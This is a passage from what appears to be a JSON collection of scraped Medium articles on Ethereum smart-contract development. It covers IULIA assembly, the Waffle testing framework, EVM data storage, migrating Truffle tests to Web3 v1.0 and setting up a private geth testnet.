sload(0)}function totalSupply() -> supply {  supply := sload(1)}Remember that we said that we store the owner in the first slot and the total supply in the second? This is where this convention is used. These two functions are of course also candidates for inlining.function mintTokens(amount) {  sstore(1, safeAdd(totalSupply(), amount))}function accountToStorageOffset(account) -> offset {  offset := add(0x1000, account)}function balanceOf(account) -> bal {  bal := sload(accountToStorageOffset(account))}function addToBalance(account, amount) {  let offset := accountToStorageOffset(account)  sstore(offset, safeAdd(sload(offset), amount))}function deductFromBalance(account, amount) {  let offset := accountToStorageOffset(account)  let bal := sload(offset)  if lt(bal, amount) { revert(0, 0) }  sstore(offset, sub(bal, amount))}The only two functions that are missing now are safeAdd and calledByOwner which are defined as follows:function safeAdd(a, b) -> r {  r := add(a, b)  if or(lt(r, a), lt(r, b)) { revert(0, 0) }}function calledByOwner() -> cbo {  cbo := eq(owner(), caller())}The safeAdd function reverts in case of an overflow as a side-effect of its evaluation.The full contract can be found below, please try it out in remix with the method explained in the beginning.I hope you enjoyed this tour of IULIA and I also hope that you find it simple and flexible enough at the same time, perhaps not for implementing full smart contract but at least for nice and readable helper functions. I am open for any suggestions, comments and ideas.By the way, there is a single syntactical element we did not cover, and this is the for-loop. In total, there are only the following 9 elements:literalfunction call (including built-ins and opcodes)function definitionvariable declaration (can have multiple variables)variable assignment (can have multiple variables)if statementswitch statementfor statementstatement blockOf these, only the first two can make up expressions.", "responses": 3, "tags": ["Ethereum", "Iulia", "Smart Contracts", "Lll", "Solidity"]}, {"title": "Introducing Waffle", "post_link": "https://medium.com/ethworks/meet-waffle-8e630e5e9e91?source=search_post", "author_name": "Marek Kirejczyk", "author_link": "https://medium.com/@marekkirejczyk", "publish_date": "2018-11-19", "last_modified_date": "2018-11-20", "readtime": "1.64", "claps": 606, "voters": 35, "content": "Introducing WaffleMarek KirejczykFollowNov 19, 2018 \u00b7 2 min readIf you care about the quality of your software, you care about tests. If you care about tests, you care about syntax and speed. We find a good testing framework is essential for creating quality software. Which brings us to smart contracts.Today testing smart contracts seem cumbersome and tedious. Frameworks have verbose syntax and make it hard to formulate precise expectations.And so we would like to announce waffle \u2014 a framework for testing smart contracts. It allows you to write short but expressive tests.Waffle is simpler and sweeter than Truffle.For example, it is easy to check what was the reason for a revert:It is easy to check which event was emitted and with what arguments:I hope the code above is pretty self-explanatory. Here is a more complete example with a couple of tests written for OpenSolidity ERC20 based token:Waffle is aiming to replace Truffle. It is simpler, faster and easier to learn and use. However, it only focuses on testing and not on creating applications.About WaffleWaffle tastes best with ES6.It is based on ethers.js and mocha.Ethers.js is a stable, small and robust js lib for accessing ethereum. It gained a lot of traction recently and seems to be on the way to be the standard js JSON RPC abstraction.RoadmapWe tested Waffle for a couple of months now and it works well for us. Our next goal is speed. On our roadmap you can find:- faster contract compilation- faster test execution- support for running tests with Geth (aside from ganache)and more!Getting startedTo learn more and start using visit Waffle GitHub.What about Mocking?Do you miss mocking smart contract functionality? Check our other library doppelg\u00e4nger.Get updatesIf would like to get updates on what we do \u2014 follow us on Medium and if you like the story \ud83d\udc4f \ud83d\udc4f \ud83d\udc4f.If you would like to get updates on Waffle \u2b50\ufe0f and follow us waffle GitHub.", "responses": 1, "tags": ["Ethereum", "Solidity", "Testing", "Unit Testing", "Truffle"]}, {"title": "Ethereum in Depth, Part 2", "post_link": "https://medium.com/zeppelin-blog/ethereum-in-depth-part-2-6339cf6bddb9?source=search_post", "author_name": "Facu Spagnuolo", "author_link": "https://medium.com/@facuspagnuolo", "publish_date": "2018-07-24", "last_modified_date": "2019-02-13", "readtime": "6.59", "claps": 235, "voters": 33, "content": "Ethereum in Depth, Part 2Facu SpagnuoloFollowJul 24, 2018 \u00b7 7 min readPhoto by Steve Halama on Unsplash.Welcome to the second part of this guide. If you haven\u2019t read part 1, I highly recommend it to better understand this post. This second article will explain everything about data management. We will see how memory, storage, calldata and stack data is manipulated.To better understand this article, you should be familiar with the basics of the EVM. If you are not, I highly recommend reading these posts first.Throughout this post we will illustrate some examples and demonstrations using sample contracts you can find in this repository. Please clone it, run npm install, and check it out before beginning.Enjoy, and please do not hesitate to reach out with questions, suggestions or feedback.Data ManagementThe EVM manages different kinds of data depending on their context, and it does that in different ways. We can distinguish at least four main types of data: stack, calldata, memory, and storage, besides the contract code. Let\u2019s analyze each of these:StackThe EVM is a stack machine, meaning that it doesn\u2019t operate on registers but on a virtual stack. The stack has a maximum size of 1024. Stack items have a size of 256 bits; in fact, the EVM is a 256-bit word machine (this facilitates Keccak256 hash scheme and elliptic-curve computations). Here is where most opcodes consume their parameters from.The EVM provides many opcodes to modify the stack directly. Some of these include:POP removes item from the stack.PUSHn places the following n bytes item in the stack, with n from 1 to 32.DUPn duplicates the nth stack item, with n from 1 to 32.SWAPn exchanges the 1st and nth stack item, with n from 1 to 32.CalldataThe calldata is a read-only byte-addressable space where the data parameter of a transaction or call is held. Unlike the stack, to use this data you have to specify an exact byte offset and number of bytes you want to read.The opcodes provided by the EVM to operate with the calldata include:CALLDATASIZE tells the size of the transaction data.CALLDATALOAD loads 32 bytes of the transaction data onto the stack.CALLDATACOPY copies a number of bytes of the transaction data to memory.Solidity also provides an inline assembly version of these opcodes. These are calldatasize, calldataload and calldatacopy respectively. The last one expects three arguments (t, f, s): it will copy s bytes of calldata at position f into memory at position t. In addition, Solidity lets you access to the calldata through msg.data.As you may have noticed, we used some of these opcodes in some examples of the previous post. Let\u2019s take a look at the inline assembly code block of a delegatecall again:assembly {  let ptr := mload(0x40)  calldatacopy(ptr, 0, calldatasize)  let result := delegatecall(gas, _impl, ptr, calldatasize, 0, 0)}To delegate the call to the _impl address, we must forward msg.data. Given that the delegatecall opcode operates with data in memory, we need to copy the calldata into memory first. That\u2019s why we use calldatacopy to copy all the calldata to a memory pointer (note that we are using calldatasize).Let\u2019s analyze another example using calldata. You will find a Calldata contract in the exercise 3 folder with the following code:contract Calldata {  function add(uint256 _a, uint256 _b) public view   returns (uint256 result)   {    assembly {      let a := mload(0x40)      let b := add(a, 32)      calldatacopy(a, 4, 32)      calldatacopy(b, add(4, 32), 32)      result := add(mload(a), mload(b))    }  }}The idea here is to return the addition of two numbers passed by arguments. As you can see, once again we are loading a memory pointer reading from 0x40, but please ignore that for now; we will explain it right after this example. We are storing that memory pointer in the variable a and storing in b the following position which is 32-bytes right after a. Then we use calldatacopy to store the first parameter in a. You may have noticed we are copying it from the 4th position of the calldata instead of its beginning. This is because the first 4 bytes of the calldata hold the signature of the function being called, in this case bytes4(keccak256(\"add(uint256,uint256)\")); this is what the EVM uses to identify which function has to be executed on a call. Then, we store the second parameter in b copying the following 32 bytes of the calldata. Finally, we just need to calculate the addition of both values loading them from memory.You can test this yourself with a truffle console running the following commands:truffle(develop)> compiletruffle(develop)> Calldata.new().then(i => calldata = i)truffle(develop)> calldata.add(1, 6).then(r => r.toString())    // 7MemoryMemory is a volatile read-write byte-addressable space. It is mainly used to store data during execution, mostly for passing arguments to internal functions. Given this is volatile area, every message call starts with a cleared memory. All locations are initially defined as zero. As calldata, memory can be addressed at byte level, but can only read 32-byte words at a time.Memory is said to \u201cexpand\u201d when we write to a word in it that was not previously used. Additionally to the cost of the write itself, there is a cost to this expansion, which increases linearly for the first 724 bytes and quadratically after that.The EVM provides three opcodes to interact with the memory area:MLOAD loads a word from memory into the stack.MSTORE saves a word to memory.MSTORE8 saves a byte to memory.Solidity also provides an inline assembly version of these opcodes.There is another key thing we need to know about memory. Solidity always stores a free memory pointer at position 0x40, i.e. a reference to the first unused word in memory. That\u2019s why we load this word to operate with inline assembly. Since the initial 64 bytes of memory are reserved for the EVM, this is how we can ensure that we are not overwriting memory that is used internally by Solidity. For instance, in the delegatecall example presented above, we were loading this pointer to store the given calldata to forward it. This is because the inline-assembly opcode delegatecall needs to fetch its payload from memory.Additionally, if you pay attention to the bytecode output by the Solidity compiler, you will notice that all of them start with 0x6060604052\u2026, which means:PUSH1   :  EVM opcode is 0x600x60    :  The free memory pointerPUSH1   :  EVM opcode is 0x600x40    :  Memory position for the free memory pointerMSTORE  :  EVM opcode is 0x52You must be very careful when operating with memory at assembly level. Otherwise, you could overwrite a reserved space.StorageStorage is a persistent read-write word-addressable space. This is where each contract stores its persistent information. Unlike memory, storage is a persistent area and can only be addressed by words. It is a key-value mapping of 2\u00b2\u2075\u2076 slots of 32 bytes each. A contract can neither read nor write to any storage apart from its own. All locations are initially defined as zero.The amount of gas required to save data into storage is one of the highest among operations of the EVM. This cost is not always the same. Modifying a storage slot from a zero value to a non-zero one costs 20,000. While storing the same non-zero value or setting a non-zero value to zero costs 5,000. However, in the last scenario when a non-zero value is set to zero, a refund of 15,000 will be given.The EVM provides two opcodes to operate the storage:SLOAD loads a word from storage into the stack.SSTORE saves a word to storage.These opcodes are also supported by the inline assembly of Solidity.Solidity will automatically map every defined state variable of your contract to a slot in storage. The strategy is fairly simple \u2014 statically sized variables (everything except mappings and dynamic arrays) are laid out contiguously in storage starting from position 0.For dynamic arrays, this slot (p) stores the length of the array and its data will be located at the slot number that results from hashing p (keccak256(p)). For mappings, this slot is unused and the value corresponding to a key k will be located at keccak256(k,p). Bear in mind that the parameters of keccak256 (k and p) are always padded to 32 bytes.Let\u2019s take a look at a code example to understand how this works. Inside the exercise 3 contracts folder you will find a Storage contract with the following code:contract Storage {  uint256 public number;  address public account;  uint256[] private array;  mapping(uint256 => uint256) private map;  function Storage() public {    number = 2;    account = this;    array.push(10);    array.push(100);    map[1] = 9;    map[2] = 10;  }}Now, let\u2019s open a truffle console to test its storage structure. First, we will compile and create a new contract instance:truffle(develop)> compiletruffle(develop)> Storage.new().then(i => storage = i)Then we can ensure that the address 0 holds a number 2 and the address 1 holds the address of the contract:truffle(develop)> web3.eth.getStorageAt(storage.address, 0)  // 0x02truffle(develop)> web3.eth.getStorageAt(storage.address, 1)  // 0x..We can check that the storage position 2 holds the length of the array as follows:truffle(develop)> web3.eth.getStorageAt(storage.address, 2)  // 0x02Finally, we can check that the storage position 3 is unused and the mapping values are stored as we described above:truffle(develop)> web3.eth.getStorageAt(storage.address, 3) // 0x00truffle(develop)> mapIndex = \u20180000000000000000000000000000000000000000000000000000000000000003\u2019truffle(develop)> firstKey = \u20180000000000000000000000000000000000000000000000000000000000000001\u2019truffle(develop)> firstPosition = web3.sha3(firstKey + mapIndex, { encoding: \u2018hex\u2019 })truffle(develop)> web3.eth.getStorageAt(storage.address, firstPosition)// 0x09truffle(develop)> secondKey = \u20180000000000000000000000000000000000000000000000000000000000000002\u2019truffle(develop)> secondPosition = web3.sha3(secondKey + mapIndex, { encoding: \u2018hex\u2019 })truffle(develop)> web3.eth.getStorageAt(storage.address, secondPosition)// 0x0AGreat! We have demonstrated that the Solidity storage strategy works as we understand it! To learn more about how Solidity maps state variables into the storage, read the official documentation.Thank you for reading this post, please remember any questions, feedback or suggestions are welcome!Be part of the communityContinue the discussion on our forumJoin our Telegram groupFollow us on TwitterEven better, join the team \ud83d\ude80", "responses": 3, "tags": ["Ethereum", "Solidity", "Smartcontracts", "Blockchain", "Guides"]}, {"title": "", "post_link": "https://medium.com/aave/hands-on-session-for-ethlend-community-on-how-to-write-a-smart-contract-with-ethereum-ba768ed5f24?source=search_post", "author_name": "Aavesome", "author_link": "https://medium.com/@Aave", "publish_date": "2017-12-13", "last_modified_date": "2018-05-27", "readtime": "1.23", "claps": 323, "voters": 30, "content": "AavesomeFollowDec 13, 2017 \u00b7 2 min readHands-on Session for ETHLend Community on How to write a Smart Contract with EthereumDo you know what Ethereum platform is? Do you know what these Smart Contracts are? Do you know how to write the simple Smart Contracts on Ethereum platform?ETHLend will host a special hands on session for the ETHLend Community to encourage more awareness of smart contracts and spark some enthusiasm into smart contract development!Ethereum is an open-source, public, blockchain-based distributed computing platform featuring smart contract functionality. Ethereum Smart Contracts are written in the Solidify programming language, which has Java and JavaScript like syntax.Smart Contracts are very different from the normal software applications that programmers have been developing till date. One mind boggling aspect of Smart Contract is that, no one can change the code of the Smart Contracts once it is deployed on the Ethereum Blockchain network\u2026.This opens up the thinking like how we will change the code if we had a bug / issue in the logic itself?To know more join our Smart Contract webinar with our Technical Advisor, Jitendra Chittoda to understand the Ethereum and Smart Contracts. Jitendra has been developing and hacking into Smart Contracts more than a year. He is passionate about Blockchain, Ethereum Smart Contracts developments.He will cover following topicsWhat is EthereumWhat is Smart ContractHow many types of accounts are there in EthereumHow Ethereum transactions worksAccess Ethereum Blockchain explorerWrite a simple Smart Contract and interact with itJoin webinar @ on YouTube on 16 December 2017, 15:00 GMT \u2014 16:30 GMTLink will be posted on our Channel and Telegram!https://www.youtube.com/watch?v=LsE8WuIzKgc", "responses": 2, "tags": ["Ethereum", "Smart Contracts", "Ethlend", "Solidity", "Webinar"]}, {"title": "Migrating your Truffle project to Web3 v1.0", "post_link": "https://medium.com/@adrianmcli/migrating-your-truffle-project-to-web3-v1-0-ed3a56f11a4?source=search_post", "author_name": "Adrian Li", "author_link": "https://medium.com/@adrianmcli", "publish_date": "2018-07-13", "last_modified_date": "2018-08-11", "readtime": "3.58", "claps": 255, "voters": 30, "content": "Migrating your Truffle project to Web3 v1.0Adrian LiFollowJul 13, 2018 \u00b7 4 min readThe most popular library for calling into Ethereum smart contracts from the Javascript world is Web3.js (repo). In fact, Truffle (the popular Ethereum dapp framework) injects this within their own test environment.Unfortunately, the framework itself (and its official examples) use the 0.20.x version of Web3.js. And while v1.0 is still technically in beta, more and more people are using it because it provides an API that is more explicit and is easier to work with (like PromiEvents, I\u2019ll talk about this below).In this article, I\u2019ll show you how to convert your Truffle tests to use the new Web3.js v1.0 API rather than the older 0.20.x versions. In the process, I will introduce some of the major changes that the v1.0 API brings.Our smart contractFor our example, let\u2019s use a simple increment/decrement counter with the following smart contract:pragma solidity ^0.4.24;contract Counter {  int count = 0;function increment() public {    count++;  }function decrement() public {    count--;  }function get() public view returns (int) {    return count;  }}Pretty basic, nothing too special about it. Now let\u2019s get into our Truffle tests.Our testsThis is what our test would look like if we followed the official Truffle documentation:This should also be pretty straight forward. We simply check that the initial value is 0, and that it can increment and decrement.Now let\u2019s see what it would look like with v1.0.It\u2019s largely the same, but there are two important differences:We use helpers from helpers.js (a file that we will create soon) so that we get access to the new Web3.js and its contract instance API.There is a new API for calling the smart contract methods.The helpersFirst, make sure you have a package.json file in your project. If not, simply run:npm init -yAnd then install the v1.0 version of web3:npm install web3Once we have that, create helpers.js in the same folder, then put the following into the file:For getWeb3, Since Truffle automagically injects the v0.20.x web3 into the global scope, we wrap it with our own v1.0 web3 and return the new one.For getContractInstance, because we want to make it a reusable function, we first take in the new web3, and then return a function that can create contract instances simply by passing in the contract name. So you can use it like this:// v1.0const web3 = getWeb3()const getInstance = getContractInstance(web3)const myContract = getInstance(\"MyContractName\")myContract.methods.myMethodName().call()Note that calling getInstance in the above example basically replaces the old way of getting a contract instance:// v0.20.xconst MyContract = artifacts.require(\"MyContractName\")const myContract = await MyContract.deployed()myContract.myMethodName.call()The new smart contract method APICalling smart contract methods are now namespaced under methods of the contract instance object. The new API looks something like this, depending on whether you are calling a constant function or a mutating one (i.e. read vs write):instance.methods.myMethod().call()instance.methods.myMethod().send({ from: \"0x...\" })Notice that the arguments for your smart contract method is now separated from the transaction-specific options (e.g. from and gas options). This allows you to build up your method call before actually sending it.Previously, the final function call would contain all the arguments of the methods, with the final argument at the end being your transaction options.// Oldinstance.myMethod(123, true, { from: \"0x...\" })// Newinstance.methods.myMethod(123, true).send({ from: \"0x...\" })// Also newconst doTheThing = instance.methods.myMethod(123, true)doTheThing.send({ from: \"0x...\" })  // execute it laterPromiEventsOne of the most convenient things with the new API is that contract methods now return a PromiEvent, which is a hybrid of a conventional Promise and an event emitter.That means you can attach numerous event handlers for the lifecycle of the transaction. But since it\u2019s also just a regular Promise, you can use await or .then() to do some work after the transaction has been mined. This provides a lot more flexibility for a better user experience.The following example is from the docs:web3.eth.sendTransaction({from: '0x123...', data: '0x432...'}).once('transactionHash', function(hash){ ... }).once('receipt', function(receipt){ ... }).on('confirmation', function(confNumber, receipt){ ... }).on('error', function(error){ ... }).then(function(receipt){    // will be fired once the receipt its mined});This would mean we can do something like this:const doSomething = instance.methods.myMethod(123, true)await doSomething.send({ from: \"0x...\" })  .once('transactionHash', (hash) => {     // notify user of the tx hash with an etherscan link  })  .on('confirmation', (confNumber) => {    // update UI to show the number of confirmations for this tx  })// the transaction has been mined, execute other code here!First, we created our method call and assigned it to doSomething. And then when we wanted to execute the transaction, we called .send() on it and passed in our transaction options.From there, we immediately let the user know the transaction hash and give them a link to the relevant Etherscan page. Once the transaction has been mined, the code will resume execution below.As an added bonus, we are also able to show the number of confirmations onto the UI if we wanted to.Try it outIt\u2019s my hope that the Truffle team can incorporate some of these ideas soon. It would be great to see more support for Web3.js v1.0. There\u2019s a severe lack of up-to-date and well-maintained Javascript libraries for working with Ethereum and I think this is the best way forward.In the mean time, I hope this article has helped you to better understand how to work with the new version of Web3.js.If you felt that this was helpful, please leave me a few claps and share!", "responses": 1, "tags": ["Ethereum", "Development", "Smart Contracts", "Solidity", "Blockchain"]}, {"title": "Getting started with Ethereum as a developer", "post_link": "https://medium.com/bcgdv-engineering/getting-started-with-ethereum-as-a-developer-af20d78c49f?source=search_post", "author_name": "Ali Muzaffar", "author_link": "https://medium.com/@ali.muzaffar", "publish_date": "2017-10-24", "last_modified_date": "2018-05-31", "readtime": "10.4", "claps": 224, "voters": 31, "content": "Getting started with Ethereum as a developerAli MuzaffarFollowOct 24, 2017 \u00b7 11 min readAs a developer, one of the first obstacles to overcome when starting a new platform is to understand the framework and how your projects are structured. This is followed by understanding how to deploy code and secure code in a test or production environment.The goal of this article is to get your started as a developer on Ethereum. We will aim to familiarise you with the tools required to setup your development environment and to deploy a smart contract on Ethereum. You don\u2019t need to have an understanding of Solidity or how to write a smart contract at this point. That is a topic for another day. We will show you how to:Setup a simulated environmentDeploy and test your smart contractsSetup a private testnet for a more realistic environment for testing your smart contracts.Setting up your first Ethereum projectBefore we get started, let\u2019s get an introduction to the terminology and the tools we are going to use.Testnet \u2014 From ethereum.stackexchange.comTestnets are \u201cplay money\u201d so that you can try out applications without spending real money. Applications are typically deployed on testnets before eventually being deployed on the main network. Etherbase is the account that would get the mining reward if you were mining. It has little relevance if you are not mining.Testrpc \u2014 from testrpc githubtestrpc is a Node.js based Ethereum client for testing and development. It uses ethereumjs to simulate full client behavior and make developing Ethereum applications much faster.Truffle \u2014 refers to the Truffle Framework \u2014 this is the most popular framework for getting started with Ethereum development. It will make your life a lot easier by handling, compiling, linking, deployment and binary management. It also handles automated testing of your smart contracts among other things.In order to create and deploy your smart contract, you need to have a blockchain to deploy and test your contract on. Here you have 4 options here:Use a dockerized testrpc image \u2014 arguably this was the easiest way to get started. However, as of writing this, the image seems to have been removed so this will not be covered.Use an simulated testnet \u2014 currently, the easiest way to get startedCreate your own private TestNet \u2014 arguably the hardest option. It provides you with a lot more control over your environment making running scenarios and debugging issues a lot easier.Connect to an existing TestNet \u2014 best option to see how your contract will behave in the real world and easier than setting up your own private TestNet.We are going to cover the second and third points in this post. Future posts will cover connecting and deploying to a public testnet and to production, so keep an eye out.Why test in a simulated or private testnetHowever, it is recommended that you first, test in a simulated testnet, then in a private testnet, before going to a public testnet and then finally into production. There are a few reasons for this:Debugging tools are next to non-existent so you want to control the environment as much as possible till you are sure your contract works.You don\u2019t want to spend all your ether on a testnet getting more ether even in the testnet will be a pain.You want to get an idea of the cost of storing your data on the blockchain, how much time it takes to execute your contracts and optimise them before going to a public testnet or production. Both the amount of data stored and the time it takes to execute contracts can significantly drive up the cost of using Ethereum.You may want control over the speed of mining during development or to visually inspect the whole blockchain.Setting up your environmentRequirements:NodeJs 6.0+ \u2014 stick to the recommended versionNPM \u2014 NPM comes with node, just make sure it\u2019s installed with the -g option. npm install npm -gEthereumJs\u2019s testrpc \u2014 npm install -g ethereumjs-testrpcTruffle \u2014 npm install -g truffleValidate that you have installed truffle properly by running truffle version on your console or command line. If you see an error something went wrong.That\u2019s it! You should have everything you need to get started as a smart contract developer.Setting up your first projectBefore we start we should take a moment to discuss the advantages and drawbacks of using the Truffle Framework. Drawbacks include not knowing what\u2019s going on. Using Truffle is simple, it completely obfuscates what it takes to compile and deploy a contract from you. This may not work for some projects and will force you to have to learn the compile and deploy process yourself. Advantages include, not needing to know what\u2019s going on \ud83d\ude00, checking dependencies before deploying and Truffle automatically remembers where the last deployment was made to.Choose a folder for your new project. Choose a directory and path without any spaces in it. A space in the path will probably not cause any issues, but some scripts can have difficulty with it.mkdir first-smart-contractcd first-smart-contracttruffle inittruffle init creates a truffle project that points to a blockchain on your computer. This project comes with a sample contract and some tests. If you wanted an empty project, you could run truffle init bare.After running truffle init the project generated should look something like this:\u279c first-smart-contract tree.\u251c\u2500\u2500 contracts\u2502 \u251c\u2500\u2500 ConvertLib.sol\u2502 \u251c\u2500\u2500 MetaCoin.sol\u2502 \u2514\u2500\u2500 Migrations.sol\u251c\u2500\u2500 migrations\u2502 \u251c\u2500\u2500 1_initial_migration.js\u2502 \u2514\u2500\u2500 2_deploy_contracts.js\u251c\u2500\u2500 test\u2502 \u251c\u2500\u2500 TestMetacoin.sol\u2502 \u2514\u2500\u2500 metacoin.js\u2514\u2500\u2500 truffle.jsIf you look inside truffle.js you\u2019ll see where a your project currently thinks an ethereum node to deploy to resides.module.exports = {  networks: {    development: {      host: \"localhost\",      port: 8545,      network_id: \"*\" // Match any network id    }  }};There is only one environment configured called development which points to localhost on port 8545. You can create paths to other environments here if you want.All the smart contract(s) reside under the contracts directory. Compiling and deploying the contracts is very straight forward.truffle compiletruffle migratetruffle compile will work, however, truffle migrate will error out since there is no blockchain running on localhost at present.What are our options to deploy to the blockchain?As mentioned earlier there are 3 main ways you can do this. Whichever way you choose the actual compile and deploy process will not change and you will still use truffle compile && truffle migrate to deploy to the chain. You can just configure the environment you want to deploy in truffle.js and then deploy to the environment using it\u2019s name truffle migrate --network <network name>. For example, our truffle.js file reads:module.exports = {   networks: {     \"live\": {       network_id: 10,       host: \"192.168.1.15\", // Point to live env       port: 8545        }   },      rpc: {     host: \"localhost\",     port: 8545   } };You can deploy to the live environment using truffle migrate --network live.Running a simulated testnet using testrpcThis is by far the simplest way to get started.Open a console separate from the one you have been working on so far and run the command testrpc -d. The -d flag makes your testrpc run in deterministic mode. This means that all mnemonic generated along with all the test wallets and private keys will be the same each time. You can try running testrpc with and without the -d flag to see this behaviour.Once testrpc is running go back to your project directory and run truffle migrate. You should see the console running testrpc output a bunch of text showing that the contract was successfully deployed. Once the deployment is successful, you can confirm that your contract is working by running truffle test which will execute the automated tests in your sample project.That\u2019s it!Once you have done this the next step is to test your contracts in your own private testnet.But before we setup our own private testnet, let\u2019s talk about the benefits and drawback of using Truffle.Setup your own private testnet.Setting up your own private testnetRequirementsNode 6+NPMGitGo \u2014 1.7 recommendedGeth \u2014 Setup Ubuntu, OSX, Windows.Note: if you\u2019re using a Debian based Linux distribution, make it Ubuntu. I tried to setup Geth on Linux Mint and kept coming up against issues. Go1.7 is recommended, however, I was able to get things up and running with Go1.6, I would recommend taking the extra step to setup Go1.7 just to invite good tides.Genesis fileBefore we setup our own private testnet, we should create a genesis file. A genesis file is the starting block for your chain. As such, it contains the initial allocation and the configuration for your chain. A genesis file is not required and you can always use a predefined one which is provided if you run geth with the --dev option. More on geth in a bit. For now, lets assume you want to use your own genesis.json file.Below is a sample genesis.json file.{    \"difficulty\": \"1\",    \"gasLimit\": \"9999999\",    \"config\": {        \"chainId\": 101,        \"homesteadBlock\": 0,        \"eip155Block\": 0,        \"eip158Block\": 0    },    \"alloc\": {        \"7ccc413a6b51be178ae62c1bcd86e8c1217c40cb\": {            \"balance\": \"1000000\"        },        \"b73f3248a841d9bb6f01d256baa3f9bfcc6a0be8\": {            \"balance\": \"1000000\"        }    }}Explaining the contents of the genesis.json filedifficulty \u2014 this is the difficulty of the cryptographic function, set this to a low number to get the block to mine fast, set it to a larger number for a more realistic or slow mining result.gasLimit \u2014 this is the maximum possible cost of mining a block. Set this to a high number for testing or development purposes.chainId \u2014 this is the ID of the chain. In practice setting this can help provide simple validation and provide protection from playback attacks (simply put, this is when an unauthorized acts as the original sender).homesteadBlock \u2014 the second major release of Ethereum was named \u201cHomestead\u201d. The first release was called \u201cFrontier\u201d. Zero-value here means that you are using Homestead.alloc \u2014 as the name implies, this is the initial allocation of Ethereum (the cryptocurrency) to wallets. The 40-character hex string is the wallet address and the balance is the amount of ether allocated to each of the wallets.As mentioned, the genesis file is not required and you can always use a predefined one which is provided if you run geth with the --dev option.It may be a good idea to familiarise yourself with the genesis file as the preallocated genesis file may not work for you, or just because you want more control over your project. Also, you probably want your initial wallets setup before you initialise your blockchain.It\u2019s also worth noting that as mentioned in this Ethereum blog post there is a python tool available for generating your own genesis.json file.Initialize the blockchain and creating an accountThe initial genesis file will have to have nothing under the alloc section because we haven\u2019t created any accounts yet. We\u2019ll have to initialise the blockchain, then create a new account on it and then run the initialisation command again. The genesis.json file I\u2019ll be using is the one below.mkdir myblockchain myblockchain/datadircd myblockchaingeth account new --datadir \"$PWD/datadir\"# outputs something like this:Passphrase: ********Repeat passphrase: ********Address: {289a21e11cb10f77f7b17fa39a0f6613ec681293}cat > genesis.json <<EOF{    \"difficulty\": \"1\",    \"gasLimit\": \"9999999\",    \"config\": {        \"chainId\": 101,        \"homesteadBlock\": 0,        \"eip155Block\": 0,        \"eip158Block\": 0    },    \"alloc\": {        \"289a21e11cb10f77f7b17fa39a0f6613ec681293\": {            \"balance\": \"1000000\"        }    }}geth init --datadir \"$PWD/datadir\" genesis.json# Ctrl+D to exit the geth consoleWe have now created a chain and created an account.Note that the balance amount is in quotes \u201c1000000\u201d.You should now have a new chain with pre-allocation to the account mentioned above. You should now check what accounts exist on your chain and assign a default one:geth --datadir \"$PWD/datadir\" account list# Outputs something like:Account #0: {289a21e11cb10f77f7b17fa39a0f6613ec681293} keystore://..We will now launch the geth console with proper configuration, assign the account shown above as our default account and check our Ethereum balance.geth --identity \"MyPrivateBC\" --rpc --rpcport \"8545\" --rpccorsdomain \"*\" --datadir \"$PWD/datadir\" --port \"30303\" --nodiscover --rpcapi \"db,eth,net,web3\" --networkid 1900 --nat \"any\" console# Inside the console to get verify your account, # set a primary account and check its balance, run:> eth.accounts[\"0x289a21e11cb10f77f7b17fa39a0f6613ec681293\"]> primary = eth.accounts[0]0x289a21e11cb10f77f7b17fa39a0f6613ec681293> eth.getBalance(\"0x289a21e11cb10f77f7b17fa39a0f6613ec681293\")1000000# Ctrl+D to exit the consoleWe have now successfully created a blockchain, created an account on the blockchain and assigned it a million Ethereum.If you want to know more about the flags on the geth command, take a look at this page. Just a word of caution that the commands shown on that page are outdated and may not work. --nodiscover will make this blockchain a private one and the only way to for other nodes to connect to you is for them to add you manually.Creating your blockchain: connecting static nodesIf you\u2019re running the console, your node will automatically connect to nodes with the same genesis file and networkId. If you follow the same setup instructions on another machine or even in an other directory you should be able to create a second node.Since your nodes are not discoverable, you need to define your static nodes. Static nodes are nodes that you always want to connect to. Your node will also automatically re-establish connection with these nodes if the connection is ever terminated.Static nodes contain information such as IP address/domain and port to connect on as well as the public key of the node to connect to. You need to create <datadir>/static_nodes.json file and add the enode URI to it. You can find your encode URI in the geth console after launching it:geth consoleWARN [10\u201316|14:51:10] No etherbase set and no accounts found as defaultINFO [10\u201316|14:51:10] Starting peer-to-peer node instance=Geth/v1.6.7-stable-ab5646c5/darwin-amd64/go1.8.3INFO [10\u201316|14:51:10] Allocated cache and file handles database=\"/Users/ali/Library/Ethereum/geth/chaindata\" cache=128 handles=1024INFO [10\u201316|14:51:10] Initialised chain configuration config=\"{ChainID: 1 Homestead: 1150000 DAO: 1920000 DAOSupport: true EIP150: 2463000 EIP155: 2675000 EIP158: 2675000 Metropolis: 9223372036854775807 Engine: ethash}\u201dINFO [10\u201316|14:51:10] Disk storage enabled for ethash caches dir=\"/Users/ali/Library/Ethereum/geth/ethash\" count=3INFO [10\u201316|14:51:10] Disk storage enabled for ethash DAGs dir=\"/Users/ali/.ethash\" count=2INFO [10\u201316|14:51:10] Initialising Ethereum protocol versions=\"[63 62] network=1INFO [10\u201316|14:51:10] Loaded most recent local header number=1536 hash=b787b8\u20267d0da3 td=39056428498300INFO [10\u201316|14:51:10] Loaded most recent local full block number=0 hash=d4e567\u2026cb8fa3 td=17179869184INFO [10\u201316|14:51:10] Loaded most recent local fast block number=1136 hash=533e56\u2026d0055d td=25929990157171INFO [10\u201316|14:51:10] Starting P2P networkingINFO [10\u201316|14:51:12] UDP listener up self=enode://1a84136963764e37cdb5768c23335175b5861419b8d747964e050f06dbfb9349dee0cc4a6e4f0f36c9a312423234e386c32e82c774a0253335cf1f7f6baf70c8@[::]:30303INFO [10\u201316|14:51:12] RLPx listener up self=enode://1a84136963764e37cdb5768c23335175b5861419b8d747964e050f06dbfb9349dee0cc4a6e4f0f36c9a312423234e386c32e82c774a0253335cf1f7f6baf70c8@[::]:30303INFO [10\u201316|14:51:12] IPC endpoint opened: /Users/ali/Library/Ethereum/geth.ipcWelcome to the Geth JavaScript console!# Ctrl+D to exitExit the console and then, create a static_nodes.json file \u2014 a sample file is shown below. Make sure to replace [::] shown above with the IP address or domain name of your machine.[\"enode://17acb9097df2ce730feb3148e21ab6346ffd21a2221c21094993e3eb6fee56cff1c576b447323d52feb79ecb10d303a1f8f4e68c64050b25e6e2840e55b22392@192.168.1.1:30303?discport=0\",    \"enode://publickey@<ipaddress>:30303?discport=0\",\"enode://publickey@<ipaddress>:30303?discport=0\",\"enode://publickey@<ipaddress>:30303?discport=0\",]Make sure to add the URI for all the nodes you want to connect to. This includes your own node. Copy this file to every node in your private network. Now when you run the geth console your nodes should connect.Since this is not a simulated environment, you will need to 